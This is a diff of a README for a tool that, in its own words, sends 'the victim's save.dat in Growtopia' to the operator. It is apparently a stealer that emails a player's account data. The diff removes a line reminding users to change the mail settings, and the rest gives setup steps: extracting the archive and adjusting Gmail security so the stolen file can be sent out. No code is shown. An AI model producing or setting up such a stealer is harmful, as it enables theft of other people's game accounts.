@@ -3,8 +3,6 @@ A program that allows you to send you the victim's save.dat in Growtopia.
 
 * Do _extract to folder ..._ while extracting the .ZIP file
 
-* Don't forgot to change mails.
-
 ## **Do these steps before running the program**
 
 * Open your _gmail_'s **Security** part. [Here](https://myaccount.google.com/security "Google Search")
